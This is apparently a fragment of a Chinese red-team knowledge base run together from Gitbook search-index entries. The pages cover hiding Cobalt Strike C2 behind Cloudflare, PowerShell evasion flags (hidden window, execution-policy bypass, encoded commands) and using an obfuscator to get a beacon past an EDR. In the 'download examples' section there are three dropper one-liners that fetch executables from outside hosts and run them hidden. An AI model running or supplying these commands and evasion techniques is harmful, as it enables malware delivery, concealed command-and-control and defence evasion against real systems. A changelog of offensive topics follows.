开启端口后，生成指向域名的shellcode，host填CDN的IP，beacons填服务端域名 访问就可以上线了 内容只是简写，肯定还有很多的坑，C2 profile一定要对！ 准备 VPS CDN 域名 域名指向vps ip CloudFlare为例子 C2文件 在header的Host参数填你的域名 配置cs 生成shellcode 略 上线 略 流量分析 注意 CDN 需要关闭缓存或开启开发模式 Cloudflare支持的HTTP端口是： 80,8080,8880,2052,2082,2086,2095 Cloudflare支持的HTTPs端口是： 443,2053,2083,2087,2096,8443 参考 https://wbglil.gitbook.io/cobalt-strike/cobalt-strikekuo-zhan/dai-xie-1 https://xz.aliyun.com/t/4509 https://mp.weixin.qq.com/s?__biz=MzAxMjE3ODU3MQ==&mid=2650509599&idx=2&sn=cd499a931d9c71096cc6b44d20e7569a&chksm=83baf4fbb4cd7ded973015b8f3bd226399d3fc4c3d7ac36d2066cbe1913292dd4860ec280cce#rd https://www.c0bra.xyz/2020/08/21/CobaltStrike-with-CloudFlare/ https://evi1cg.me/archives/Domain_Fronting.html Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2021-10-09 15:03:11 "},"个人知识库/06.免杀/powershell/01.Powershell扫盲.html":{"url":"个人知识库/06.免杀/powershell/01.Powershell扫盲.html","title":"01.Powershell扫盲","keywords":"","body":" 简介 环境介绍 注意事项 开发工具 代码调试 Powershell启动命令参数 EncodedCommand WindowStyle Hidden NonInteractive NoProfile ExecutionPolicy ByPass Sta NoExit NoLogo Command 举例 交互式SHELL 获取帮助命令 查找实现指定任务的命令 将管道输出的结果保存到文件中 获取进程信息 环境变量 获取历史命令 向文件的结尾处加入信息 变量 变量示例代码1 变量示例代码2 逻辑表达式 条件语句 if、elseif和else语句 选择分支 循环结构 While do...while和do...until for foreach 数组 字符串操作 字符串分割 split 字符串替换replace 文件操作 查看一个文件是否存在 从文件读取文本 向文件写入文本 命令行参数 函数 创建 函数传参数 下载案例 简介 为了保障木马样本的体积很小利于传播。攻击者会借助宏->WMI->Powershell的方式下载可执行文件恶意代码。最近也经常会遇见利用Powershell通过Windows自带的组件执行系统命令绕过UAC下载文件手法的文章。 UAC：用户帐户控制（User Account Control，简写作UAC)是微软公司在其Windows Vista及更高版本操作系统中采用的一种控制机制。其原理是通知用户是否对应用程序使用硬盘驱动器和系统文件授权，以达到帮助阻止恶意程序（有时也称为“恶意软件”）损坏系统的效果。 PowerShell：Windows PowerShell是一种命令行外壳程序和脚本环境，使命令行用户和脚本编写者可以利用 .NET Framework的对象，在病毒样本传播与渗透测试场景中用于下载第二阶段的病毒文件和执行文件。 环境介绍 注意事项 Powershell 默认是不允许执行 PS1 脚本的，这就需要我们自己使用Set-ExecutionPolicy来修改默认策略。 使用Get-ExecutionPolicy可以获取当前的策略: PS C:\\Users\\d4mlts\\Desktop> Get-executionpolicy Restricted 一共有 6 种策略，分别是：Undefined, Bypass, Unrestricted, Remotesigned, Allsigned, Restricted，更详细的可以参考：https://technet.microsoft.com/library/hh847748.aspx 这里简单的说下六种策略的区别： Restricted. 不读取任何配置文件、不运行任何脚本，这个是默认策略。 AllSigned. 所有的脚本和配置文件必须有受信任的的发布者的签名，就算是自己写的脚本也同样如此，否则无法执行。 RemoteSigned. 和上面的类似，但是针对的是从网上下载下来的脚本，这些脚本同样也需要可信的签名。 Unrestricted. 可以运行脚本或者读取配置文件，如果执行的是从网上下载的脚本，那么会有一个申请权限的提示。 Bypass. 不阻止任何脚本或配置文件，也不会显示警告或者提示。 Undefined. 把当前 scope 的所有策略全部都删除，但是不会删除 Group Policy scope 中的策略。如果你想删除某个设置好的策略，用这个就行了。 Windows下PowerShell默认的权限级别是Restricted，如果在Restricted权限运行PowerShell会提示错误信息： 将权限修改为Bypass Set-ExecutionPolicy Bypass # 需要管理员权限 开发工具 开发工具可以使用自带的Windows PowerShell ISE。 PowerShell的运行后缀为.ps1，也可以通过交互式运行。 代码调试 自带的编译器常用快捷键：F9下断点、F5执行、F10单步执行 Powershell启动命令参数 EncodedCommand 使用此参数向PowerShell传递base64编码字符串并运行。 变种使用方法： 方式1：\"-enc\" 方法2：\"-Enc\" 方法3：\"-EncodedCommand\" 方法4：\"-encodedcommand\" 方法5：\"-encodedCommand\" 方法6：\"-ec\" 方法7：\"-en\" 方法8：\"-ENC\" WindowStyle Hidden 使用此参数避免PowerShell执行时显示运行窗口。 变种使用方法： 方式1 ：\"-window hidden\" 方法2 ：\"-W Hidden\" 方法3 ：\"-w hidden\" 方法4 ：\"-windowstyle hidden\" 方法5 ：\"-win hidden\" 方法6 ：\"-WindowStyle Hidden\" 方法7 ：\"-win Hidden\" 方法8 ：\"-wind hidden\" 方法9 ：\"-WindowStyle hidden\" 方法10：\"-WindowStyle hiddeN\" 方法11：\"-windows hidden\" 方法12：\"-WindowStyle hiddeN\" 方法13：\"-windows hidden\" 方法14：\"-Win Hidden\" 方法15：\"-win hid\" 方法16：\"-Windows hidden\" 方法17：\"-Wind Hidden\" 方法18：\"-Win hidden\" NonInteractive 使用此参数避免显示一个交互对话窗口。此方法与WindowStyle隐藏方法配合使用以隐藏执行痕迹。 其中使用“-noni”的变种中76%是通用型的shellcode注入代码或SET工具，而使用“-NonI”的变种主要是PowerShell Empire工具。 变种使用方法： 方式1 ：\"-noni\" 方法2 ：\"-Nonl\" 方法3 ：\"-noninteractive\" 方法4 ：\"-Nonlnteractive\" 方法5 ：\"-nonl\" NoProfile 使用此参数阻止PowerShell在开机时加载配置文件脚本，以避免载入非预期的命令或设置。与非交互方式类似，“-nop”方法主要由SET和通用型shellcode注入变种采用，而“-NoP”方法主要由PowerShell Empire使用。 变种使用方法： 方式1 ：\"-nop\" 方法2 ：\"-NoP\" 方法3 ：\"-noprofile\" 方法4 ：\"-NoProfile\" 方法5 ：\"-noP\" ExecutionPolicy ByPass 使用此参数绕过默认的PowerShell脚本执行策略（即受限策略），可以执行任何代码。有趣的是，使用EncodedCommand参数执行的代码不受执行策略影响。 变种使用方法： 方式1： \"-ep bypass\" 方式2： \"-exec bypass\" 方式3： \"-executionpolicy bypass\" 方式4： \"-Exec Bypass\" 方式5： \"-ExecutionPolicy ByPass\" 方式6： \"-Exec ByPass\" 方式7： \"-ExecutionPolicy Bypass\" 方式8： \"-ExecuTionPolicy ByPasS\" 方式9： \"-exe byPass\" 方式10： \"-ep Bypass\" 方式11： \"-ExecutionPolicy BypasS\" 方式12： \"-Exe ByPass\" Sta 使用单线程模式（现在是PowerShell 3.0的默认模式）。此参数基本上是PowerShell Empire在使用。 变种使用方法： 方法1：\"-sta\" NoExit 使用此参数阻止PowerShell在运行启动命令后退出。这是PowerWorm恶意软件除EncodedCommand参数外使用的唯一参数。 变种使用方法： 方法1：\"-noexit\" NoLogo 避免PowerShell启动时显示版权信息。 变种使用方法： 方式1： \"-Nol\" 方式2： \"-NoL\" 方式3： \"-nologo\" 方式4： \"-nol\" Command 利用该参数可以执行参数后面的命令，就如同直接在PowerShell提示符下输入命令一样。我只捕捉到一个样本，它直接附加到某个恶意软件中，该恶意软件在FireEye发布的一篇关于绕过基于签名的检测方法的博文中提到过。该PowerShell脚本包含在一个DOCM文件的“Comments“域中，通过Word文档的宏加载执行。以下是该样本的恶意PowerShell代码片段，通过将多条命令组合在一起，可以实现FTP传输和NetCat建连目的。 变种使用方法： 方式1： \"-c\" 常见组合示例代码： 方式1： \"-window hidden -enc\" 方式2： \"-enc\" 方式3： \"-nop -noni -enc\" 方式4： \"-NoP -sta -Nonl -W Hidden -Enc\" 方式5： \"-EncodedCommand\" 方式6： \"-ep bypass -noni -W Hidden -Enc\" 方式7： \"-Nop -Nonl -W Hidden -Enc\" 方式8： \"-nop -win hidden -noni -enc\" 方式9： \"-executionpolicy bypass -windowstyle hidden -enc\" 方式10： \"-nop -exec bypass -win Hidden -noni -enc\" 举例 1）下载文件：在捕获到的样本中最常用的办法就是使用.net框架下的System.Net.WevClient类的DownloadFile()方法来下载文件。 2）运行文件：运行计算机上的可执行文件或文档，例如.exe或.txt文件。 示例代码： # 1、下载文件 pOWErsHell.ExE -exEcUTIonPOLICy BYpAsS -nOprOFile -winDOWStyLE HiDden (NEW-objeCt SYSTeM.Net.weBCLIEnT).DOWNloaDfIlE('file://C:\\Windows\\System32\\calc.exe','D:\\powershell_calc.EXE'); # 1.1 拆分代码 $client = new-object System.Net.WebClient $client.DownloadFile(‘file://C:\\Windows\\System32\\calc.exe’, ‘D:\\powershell_calc.EXE’) # 2、运行文件 sTArt-PrOCeSS 'D:\\powershell_calc.EXE' 交互式SHELL Powershell有许多内置的交互式Shell命令。 获取帮助命令 Get-Help 查找实现指定任务的命令 Get-Command Get-command pwd # 查看pwd对应的Powershell命令 Get-command ls # 查看ls对应的Powershell命令 Get-command cd # 查看cd对应的Powershell命令 将管道输出的结果保存到文件中 通过Out-File命令或者重定向>>操作符将输出结果保存到文件中。 Get-Command | Out-File D:\\unicodefile.txt 获取进程信息 Get-Process 环境变量 dir ENV: # 查看所有环境变量 $ENV:COMPUTERNAME # 查看计算机名 获取历史命令 Get-History 向文件的结尾处加入信息 Get-Process >> D:\\files.txt Get-Process | Out-File -Append D:\\files.txt \"Hello zzzhhh\" >> D:\\files.txt 变量 在powershell中变量名均是以美元符”$”开始，剩余字符可以是数字、字母、下划线的任意字符，并且powershell变量名大小写不敏感（$a和$A 是同一个变量)。 某些特殊的字符在powershell中有特殊的用途，一般不推荐使用这些字符作为变量名。当然你硬要使用，请把整个变量名后缀用花括号括起来。 PS C:\\test> ${\"I\"like $}=\"mossfly\" PS C:\\test> ${\"I\"like $} mossfly Powershell的变量可以存储一些命令的输出，因为所有变量都是对象，所以变量都带有一些方法。 变量示例代码1 ## 普通写法 $result = Get-Process # 将进程信息存储到$result $result $Loc = Get-Location #定义变量Loc，得到当前路径 $Loc #输出当前路径 ## 花括号写法 ${Hello Computer Name} = \"I 'am string\" ${Hello Computer Name} # 输出变量内容 变量示例代码2 PowerShell变量有一些内置的方法和属性，可以很方便对字符串操作。 以及获取用户主目录、脚本相关的内置变量 ### 字符串长度 ${Hello Computer Name}.Length ### 字符串大小写 ${Hello Computer Name}.ToUpper() ## 内置变量 ### 获取当前执行脚本的目录路径 $PSScriptRoot ### 获取用户主目录的路径 $HOME 逻辑表达式 计算、逻辑、比较运算符 +=, −=, ×=, ÷=, %=, ++, −−, = 将一个或者多个值赋给一个变量 -and,-or,-not,-xor,! 连接表达式/声明 -eq, -ne 相等, 不等 -gt, -ge 大于, 大于或等于 -lt, -le 小于, 小于或等于 -replace 替换字符 -match,-notmatch 正则表达式匹配 -like,-notlike 通配符匹配 示例代码： # + - * / ++ ${3+7} = 3+7 ${3+7} ${'a'+'b'} = 'a'+'b' # 字符串相加 ${'2'+3} = '2'+3 # 字符加数字 ${5-2} = 5 - 2 ${4*3} = 4 * 3 ${7/2} = 7/2 ${7%2} = 7%2 ${3+7}++ # 自增符号 # 输出结果 ${3+7} # 自增的结果 ${'a'+'b'} ${'2'+3} ${5-2} ${4*3} 条件语句 if、elseif和else语句 $a = 89 $b = 90 if($a -gt $b) { echo \"$a 大于 $b\" } elseif($a -eq $b) { echo \"$a 等于 $b\" } elseif($a -lt $b) { echo \"$a 小于 $b\" } 选择分支 将If-ElseIF-Else转换成Switch语句 switch(expression) { value1 ｛ first set of stantements｝ value2 ｛ second set of stantements｝ default｛ final set of stantements｝ } 示例代码： $a = {1,2,3,4,5} $b = 2 $c = 3 switch($b) { 1 {\"Beijing\"} 2 {\"Shanghai\"} 3 {\"Tianjin\"} 4 {\"Chongqing\"} default {\"default\"} } 循环结构 While while循环中的表达式如果为True，在完成了该语句之后，PowerShell回到顶部再次计算表达式。具有如下形式： while(expression) { statement(s) } do...while和do...until do循环与while循环类似，只不过它在循环的末尾执行测试，语句statement总是至少执行一次。如果表达式为True的话，循环继续。PowerShell中有两种do循环的方式。 do...while重复该循环，如果表达式为False的话，循环退出。 do...until重复该循环，如果表达式为True的话，循环退出。 do循环语句的两种形式如下： # 形式1： do{ statement(s) ... }while(expression) # 形式2： do{ statement（s) }until(expression) for for循环取自C和C++编程语言，该语句的形式是： for(初始化;条件;增量){ statement(声明) } foreach foreach循环可以依次查看一个数组、一个散列表或者一个其他集合对象中的每一项。该语句有两种形式，第一种形式每次通过statement(s)语句的时候，指定的遍历拥有集合中的一项的值。形式如下： foreach($veriable in collection){ statement(s) } 数组 Powershell允许一个变量保存多个独立的值。 示例代码： # 数值数组 $powers = 8,4,2,1 # 字符串数组 $name = '小Z','小J','小H','小D' # PowerShell还允许使用圆括号并使用一个可选的@符号来输入值的列表 $name1 = @('BOSS','ZZZHHH','Antiy','Python') # 访问数组 访问单独的项，数组索引从0开始 $name[0] $name[1] $name[2] $name[3] 字符串操作 字符串分割 split string1 -split string2 说明： string1 字符串 string2 分割符 示例代码： $string2 = \"192.168.14.20,192.168.14.21,192.168.14.22,192.168.14.23\" $string2 -split \",\" # ,号过滤出IP 字符串替换replace string -replace pattern,replacement 说明： pattern是一个正则表达式。 raplacement匹配的文本 示例代码： 注意：反转义 前面说过pattern是一个正则表达式，加上\\就是反转义代表不要用正则表达式匹配字符。 ([Regex]::Escape(\"字符串\"))：使用此方法可以直接不规避正则表达式解析而去做一个替换。 示例代码： $string = \"Hello C++\" $string -replace \"c\\+\\+\",\"World\" # 输出 $string的值为 Hello World $string -replace ([Regex]::Escape(\"C++\")),\"Powershell Program\" 文件操作 当使用PowerShell来遍历文件、文件夹甚至注册表的时候，将会遇到几种基本的对象类型。主要的对象是System.IO.Directory和System.IO.FileInfo，它们分别表示文件夹和文件。 查看一个文件是否存在 要查看一个文件是否存在，可以创建一个System.IO.FileInfo对象，并测其Exists属性。如下面的示例： $fobj = new-object System.IO.FileInfo \"C:\\temp\\testfile.txt\" if ($fobj.Exists){'the file does exist'} 从文件读取文本 使用.NET System.IO.FileStream对象从文件读取二进制数据。示例代码： # 从文件读取文本 $fobj = get-item \"D:\\filename.txt\" $strm = $fobj.OpenText() # 打开文件 $n = 0 while(!$strm.EndOfStream){ $txt = $strm.ReadLine() # 读取文件 $n++ \"$n : $txt\" } $strm.Dispose() # 关闭文件 使用cmdlet来做同样的事情 # 使用Get-Content执行读取文本操作 $n = 0 #Get-Content \"D:\\filename.txt\" Get-Content \"D:\\20171111-test.txt\" | foreach { $n++;\"$n ; $_\"} 向文件写入文本 可以使用重定向>运算符，将cmdlet输出重定向到一个文件。想要更为精确地构造一个文件。将文本写入到一个文件的模式如下： # 向文件写入文本 $fobj = New-Object System.IO.FileInfo \"D:\\testfilename.txt\" $strm = $fobj.CreateText() $strm.WriteLine(\"this is the first line\") for($i=1;$i -le 10; $i++) { $i $strm.Write(\"$i \") } $strm.WriteLine() $strm.Dispose() 命令行参数 $args返回所有的参数 传递给一个函数或者一个脚本的参数都保存在$args变量中。 示例代码： # 参数传值,返回所有参数 Write-Host \"Hello,$args\" # 访问数组参数 For($i=0;$i -lt $args.Count; $i++) { Write-Host \"parameter $i : $($args[$i])\" } 函数 创建 定义函数形式如下： function simple(){ return 1 } 函数参数：Powershell中用户定义的函数，可以给定参数值。 function simple(arg1,arg2){ return 1 } 调用形式：simple abc def 其中abc、def是对simple函数两个参数的调用。 函数传参数 在函数的语句块中放置一条param语句作为其第一条语句。从而给函数所使用的参数指定名称。 param(类型声明$参数名=可选值) 示例代码： # 函数定义 function simple(){ return 1 } ## 调用函数 simple # 带参数的函数 function printmsg { param([int]$level=1 ,$message) Write-Output $level,$message } ## 带参调用函数 printmsg 4 'this is the message' # param语句 function printparam { param([string]$level=1,[string]$message) Write-Output $level,$message } ## param指定参数 printparam -message 'this is the message' -level 10 下载案例 # 第一个： powershell -WindowStyle Hidden $wscript = new-object -ComObject WScript.Shell;$webclient = new-object System.Net.WebClient;$random = new-object random;$urls = 'http://commercset.pl/file/jet.jkl'.Split(',');$name = $random.next(1, 65536);$path = $env:temp + '\\' + $name + '.exe';foreach($url in $urls){try{$webclient.DownloadFile($url.ToString(), $path);Start-Process $path;break;}catch{write-host $_.Exception.Message;}} # 第二个： pOWErsHell.ExE -exEcUTIonPOLICy BYpAsS -nOprOFile -winDOWStyLE HiDden (NEW-objeCt SYSTeM.Net.weBCLIEnT).DOWNloaDfIlE('http://b.reich.io/dvltdc.exe','C:\\Users\\UserPII_791ce421809b22355905f0e9df666c58e5309959\\AppData\\Roaming.EXE');sTArt-PrOCeSS 'C:\\Users\\UserPII_791ce421809b22355905f0e9df666c58e5309959\\AppData\\Roaming.Exe' # 第三个： powErsheLL.EXe -WindowSTYlE HIDdeN -NoPrOfIle -EXeCuTionPOlicy bypaSS (NEW-ObjECt SySTEm.Net.WEbCLIent).DOwNLOadFiLe('http://182.255.5.201/~bemkmund/two/files/fresh/whe.exe','C:\\Users\\办票间~1\\AppData\\Local\\Temp\\\\doce.exe') Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-01-31 14:54:07 "},"个人知识库/06.免杀/powershell/02.powershell混淆.html":{"url":"个人知识库/06.免杀/powershell/02.powershell混淆.html","title":"02.powershell混淆","keywords":"","body":" 前言 工具 过程 前言 某次项目中，目标的机器上存在某服EDR，为了上线到内网中继的cs，使用cs直接生成的powershell脚本会直接被杀，想着混淆一下ps1脚本来达到目的 工具 这里我直接github找了一款混淆工具，能成功绕过EDR，所以记录一下 https://github.com/tokyoneon/chimera 直接使用它的推荐命令可能会报错 ./chimera.sh -f shells/Invoke-PowerShellTcp.ps1 -l 3 -o /tmp/chimera.ps1 -v -t powershell,windows,\\ copyright -c -i -h -s length,get-location,ascii,stop,close,getstream -b new-object,reverse,\\ invoke-expression,out-string,write-error -j -g -k -r -p 可以看看其他的说明文档：https://github.com/tokyoneon/Chimera/blob/master/USAGE.md 过程 ./chimera.sh -f beacon.ps1 -a Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-01-31 15:16:50 "},"更新日志.html":{"url":"更新日志.html","title":"更新日志","keywords":"","body":" 2021年12月 2021年12月18日 2021年12月25日 2021年12月27日 2021年12月28日 2021年12月29日 2021年12月30日 2021年12月31日 2022年01月 2022年01月06日 2022年01月08日 2022年01月17日 2022年01月19日 2022年01月20日 2022年01月21日 2022年01月25日 2022年01月29日 2022年02月 2022年02月07日 2022年02月08日 2022年02月10日 2022年02月11日 2022年02月16日 2022年02月23日 2022年02月24日 2022年03月 2022年03月01日 2022年03月04日 2022年03月08日 2022年03月09日 2022年03月20日 2022年03月22日 \\[(.*?)\\]\\(.*?\\) $1 ^A.*?个人知识库/(.*?)/README\\.md$ | [$1](个人知识库/$1/) | 新增 | ^M.*?个人知识库/(.*?)/README\\.md$ | [$1](个人知识库/$1/) | 补充更新 | ^A.*?个人知识库/(.*?)\\.md$ | [$1](个人知识库/$1.html) | 新增 | ^M.*?个人知识库/(.*?)\\.md$ | [$1](个人知识库/$1.html) | 补充更新 | 2021年12月 2021年12月18日 知识框架搭建 2021年12月25日 路径 操作 02.代码审计/01.Java安全/1.审计基础/01.JVM类加载机制 新增 02.代码审计/01.Java安全/1.审计基础/02.Java反射机制 新增 02.代码审计/01.Java安全/1.审计基础/03.Java序列化与反序列化 新增 02.代码审计/01.Java安全/1.审计基础/04.RMI基础 新增 02.代码审计/01.Java安全/1.审计基础/05.JNDI注入 新增 02.代码审计/01.Java安全/1.审计基础/06.IDEA断点调试 新增 02.代码审计/01.Java安全/1.审计基础/07.Java加载字节码 新增 02.代码审计/01.Java安全/1.审计基础/08.javassist字节码编程 新增 02.代码审计/01.Java安全/1.审计基础/09.EL表达式 新增 02.代码审计/01.Java安全/1.审计基础/10.SpEL表达式 新增 02.代码审计/01.Java安全/1.审计基础/11.OGNL表达式 新增 02.代码审计/01.Java安全/1.审计基础/12.IDEA调试JAR 新增 02.代码审计/01.Java安全/2.各种分析/09.log4j2_rce分析 新增 02.代码审计/01.Java安全/2.各种分析/01.Apache_Commons_Collections中的反序列化 新增 02.代码审计/01.Java安全/2.各种分析/02.URLDNS链分析 新增 02.代码审计/01.Java安全/2.各种分析/03.log4j反序列化漏洞分析 新增 02.代码审计/01.Java安全/2.各种分析/04.Fastjson 1.2.24反序列化漏洞分析 新增 02.代码审计/01.Java安全/2.各种分析/05.Fastjson的dnslog探测方式分析 新增 02.代码审计/01.Java安全/2.各种分析/06.Fastjson各版本漏洞分析 新增 02.代码审计/01.Java安全/2.各种分析/07.Fastjson1.2.68分析 新增 02.代码审计/01.Java安全/2.各种分析/08.ysoserial-C3P0分析 新增 02.代码审计/01.Java安全/3.内存马/01.Tomcat内存马 新增 02.代码审计/01.Java安全/3.内存马/02.Spring内存马 新增 02.代码审计/01.Java安全/3.内存马/03.Java Agent 内存马 新增 2021年12月27日 路径 操作 01.渗透测试/01.信息收集/1.资产收集/1.信息收集之主域名收集 新增 01.渗透测试/01.信息收集/1.资产收集/2.信息收集之子域名收集 新增 01.渗透测试/01.信息收集/1.资产收集/3.信息收集之其他信息收集 新增 01.渗透测试/01.信息收集/2.绕过CDN寻找真实IP/1.绕过CDN寻找真实IP 新增 02.代码审计/01.Java安全/1.审计基础/05.JNDI注入 修正一张错误图片 03.编程开发/GO/01.GO入门基础 新增 04.暂未分类/01.代理类/Linux下搭建ShadowSocks服务器 新增 2021年12月28日 路径 操作 04.暂未分类/02.GIT/1.gitbook 新增 2021年12月29日 路径 操作 03.编程开发/GO/02.GO常用实例 新增 03.编程开发/GO/03.使用GO编写POC 新增 2021年12月30日 路径 操作 02.代码审计/02.C:C++/01.工具Flawfinder 新增 2021年12月31日 路径 操作 03.编程开发/GO/04.使用GO模拟登陆 新增 2022年01月 2022年01月06日 路径 操作 01.渗透测试/01.信息收集/1.资产收集/01.主域名收集/01.ICP备案查询 新增 01.渗透测试/01.信息收集/1.资产收集/01.主域名收集/02.WHOIS查询 新增 01.渗透测试/01.信息收集/1.资产收集/01.主域名收集/03.证书查询 新增 01.渗透测试/01.信息收集/1.资产收集/01.主域名收集/04.DNS共享记录查询 新增 01.渗透测试/01.信息收集/1.资产收集/01.主域名收集/05.IP反查 新增 01.渗透测试/01.信息收集/1.资产收集/01.主域名收集 新增 01.渗透测试/01.信息收集/1.资产收集/02.子域名收集/01.证书透明度 新增 01.渗透测试/01.信息收集/1.资产收集/02.子域名收集/02.DNS域传送 新增 01.渗透测试/01.信息收集/1.资产收集/02.子域名收集/03.DNS公开数据集 新增 01.渗透测试/01.信息收集/1.资产收集/02.子域名收集/04.搜索引擎 新增 01.渗透测试/01.信息收集/1.资产收集/02.子域名收集/05.信息泄露 新增 01.渗透测试/01.信息收集/1.资产收集/02.子域名收集/06.第三方在线平台 新增 01.渗透测试/01.信息收集/1.资产收集/02.子域名收集/07.子域名枚举爆破 新增 01.渗透测试/01.信息收集/1.资产收集/02.子域名收集/08.工具自动化 新增 01.渗透测试/01.信息收集/1.资产收集/02.子域名收集/09.构造域名 新增 01.渗透测试/01.信息收集/1.资产收集/02.子域名收集/10.存活性探测 新增 01.渗透测试/01.信息收集/1.资产收集/02.子域名收集 新增 01.渗透测试/01.信息收集/1.资产收集/03.IP段信息收集/01.绕过CDN寻找真实IP 新增 01.渗透测试/01.信息收集/1.资产收集/03.IP段信息收集/02.网络空间搜索引擎 新增 01.渗透测试/01.信息收集/1.资产收集/03.IP段信息收集/03.C段扫描工具 新增 01.渗透测试/01.信息收集/1.资产收集/03.IP段信息收集/04.组合工具 新增 01.渗透测试/01.信息收集/1.资产收集/03.IP段信息收集/05.浏览器插件 新增 01.渗透测试/01.信息收集/1.资产收集/03.IP段信息收集/06.端口对应渗透（端口渗透备忘录） 新增 01.渗透测试/01.信息收集/1.资产收集/03.IP段信息收集 新增 01.渗透测试/01.信息收集/1.资产收集/04.其他应用收集/01.小程序 新增 01.渗透测试/01.信息收集/1.资产收集/04.其他应用收集/02.公众号 新增 01.渗透测试/01.信息收集/1.资产收集/04.其他应用收集/03.APP 新增 01.渗透测试/01.信息收集/1.资产收集/04.其他应用收集 新增 01.渗透测试/01.信息收集/1.资产收集/1.信息收集之主域名收集 新增 01.渗透测试/01.信息收集/1.资产收集/2.信息收集之子域名收集 新增 01.渗透测试/01.信息收集/1.资产收集/3.信息收集之其他信息收集 新增 01.渗透测试/01.信息收集/2.指纹识别/01.CMS识别/01.在线平台 新增 01.渗透测试/01.信息收集/2.指纹识别/01.CMS识别/02.工具 新增 01.渗透测试/01.信息收集/2.指纹识别/01.CMS识别/03.浏览器插件 新增 01.渗透测试/01.信息收集/2.指纹识别/01.CMS识别 新增 01.渗透测试/01.信息收集/2.指纹识别/02.WAF识别 新增 01.渗透测试/01.信息收集/3.敏感信息收集/01.目录扫描 新增 01.渗透测试/01.信息收集/3.敏感信息收集/02.Google Hacking 新增 01.渗透测试/01.信息收集/3.敏感信息收集/03.GitHub信息收集 新增 01.渗透测试/01.信息收集/3.敏感信息收集/04.JS信息收集 新增 01.渗透测试/01.信息收集/3.敏感信息收集/05.网盘信息收集 新增 01.渗透测试/01.信息收集/3.敏感信息收集/06.邮箱信息收集 新增 01.渗透测试/01.信息收集/3.敏感信息收集/07.历史页面 新增 2022年01月08日 路径 操作 01.渗透测试/02.WEB漏洞/01.SQL注入/01.注入点检测 新增 01.渗透测试/02.WEB漏洞/01.SQL注入/02.数据库识别 新增 01.渗透测试/02.WEB漏洞/01.SQL注入/MSSQL/01.常用符号:函数:语句归类 新增 01.渗透测试/02.WEB漏洞/01.SQL注入/MSSQL/02.各种注入手法 新增 01.渗透测试/02.WEB漏洞/01.SQL注入/MySQL/01.常用符号:函数:语句归类 新增 01.渗透测试/02.WEB漏洞/01.SQL注入/MySQL/02.各种注入手法 新增 01.渗透测试/02.WEB漏洞/01.SQL注入/Oracle/01.常用符号:函数:语句归类 新增 01.渗透测试/02.WEB漏洞/01.SQL注入/Oracle/02.各种注入手法 新增 01.渗透测试/02.WEB漏洞/01.SQL注入 新增 01.渗透测试/02.WEB漏洞/02.XSS 新增 01.渗透测试/02.WEB漏洞/03.CSRF/01.CSRF 新增 01.渗透测试/02.WEB漏洞/03.CSRF/02.一次XSS和CSRF的组合拳进攻（CSRF+JSON） 新增 01.渗透测试/02.WEB漏洞/03.CSRF/03.CSRF绕过Referer技巧 新增 01.渗透测试/02.WEB漏洞/04.XXE 新增 01.渗透测试/02.WEB漏洞/05.SSTI注入 新增 01.渗透测试/02.WEB漏洞/06.未授权访问/01.未授权访问漏洞总结 新增 01.渗透测试/02.WEB漏洞/06.未授权访问/02.Redis未授权访问漏洞利用 新增 01.渗透测试/02.WEB漏洞/07.XPATH注入 新增 01.渗透测试/02.WEB漏洞/08.SAML测试 新增 01.渗透测试/02.WEB漏洞/09.XSSI 新增 01.渗透测试/02.WEB漏洞/10.XSLT 新增 01.渗透测试/02.WEB漏洞/11.XS-Leaks 新增 01.渗透测试/03.思路技巧/01.利用SourceMap还原前端js代码 新增 01.渗透测试/03.思路技巧/02.任意用户密码重置的10种姿势 新增 01.渗透测试/03.思路技巧/03.API接口测试 新增 01.渗透测试/04.权限维持/01.Windows权限维持 新增 01.渗透测试/04.权限维持/02.Linux权限维持 新增 01.渗透测试/04.权限维持/03.扩展 新增 01.渗透测试/04.权限维持 新增 01.渗透测试/05.APP小程序/01.获取微信小程序源码 新增 01.渗透测试/05.APP小程序/02.Xserver 新增 01.渗透测试/05.APP小程序/03.HTTP单向验证+双向验证解释 新增 01.渗透测试/05.APP小程序/04.证书双向验证抓包 新增 01.渗透测试/06.保护自己/01.GitHub云扫描器 新增 01.渗透测试/06.保护自己/02.防止Burp被识别 新增 03.编程开发/GO/03.beego框架/beego框架 新增 04.暂未分类/02.GIT/2.gitlab搭建 新增 05.C2/01.CS/1.破解CS 新增 05.C2/01.CS/2.Malleable-C2-Profiles 新增 05.C2/01.CS/3.启动 新增 05.C2/01.CS/4.目录和菜单中文说明 新增 05.C2/01.CS/5.Beacon 新增 05.C2/01.CS/6.进阶：隐藏C2（通过特征） 新增 05.C2/01.CS/7.进阶：隐藏C2（通过CDN） 新增 2022年01月17日 路径 操作 01.渗透测试/02.WEB漏洞/12.SSRF/SSRF 新增 03.编程开发/GO/01.GO基础 补充更新 03.编程开发/GO/02.GO实例/01.GO常用实例 补充更新 03.编程开发/GO/02.GO实例/04.使用GO+selenium 新增 04.暂未分类/02.GIT/2.gitlab搭建 新增 2022年01月19日 路径 操作 03.编程开发/GO/02.GO实例/05.限制GO并发数 新增 2022年01月20日 路径 操作 01.渗透测试/02.WEB漏洞/01.SQL注入/03.MySQL/02.各种注入手法 补充limit和update注入 01.渗透测试/02.WEB漏洞/01.SQL注入/03.MySQL/03.绕过技巧 新增 01.渗透测试/02.WEB漏洞/01.SQL注入/06.PostgreSQL/01.常用符号:函数:语句归类 新增 01.渗透测试/02.WEB漏洞/01.SQL注入/06.PostgreSQL/02.各种注入手法 新增 01.渗透测试/02.WEB漏洞/01.SQL注入/06.PostgreSQL/03.绕过技巧 新增 01.渗透测试/02.WEB漏洞/01.SQL注入/06.PostgreSQL 新增 2022年01月21日 路径 操作 01.渗透测试/02.WEB漏洞/01.SQL注入/03.MySQL/01.常用符号:函数:语句归类 补充更新 01.渗透测试/02.WEB漏洞/01.SQL注入/03.MySQL/02.各种注入手法 补充更新 01.渗透测试/02.WEB漏洞/01.SQL注入/03.MySQL/03.绕过技巧 补充更新 01.渗透测试/02.WEB漏洞/01.SQL注入/04.MSSQL/02.各种注入手法 补充更新 01.渗透测试/02.WEB漏洞/01.SQL注入/04.MSSQL/03.绕过技巧 新增 01.渗透测试/02.WEB漏洞/01.SQL注入/05.Oracle/03.绕过技巧 新增 03.编程开发/GO/02.GO实例/06.使用GO上传图片 新增 2022年01月25日 路径 操作 01.渗透测试/01.信息收集/1.资产收集/01.主域名收集/06.股权信息 新增 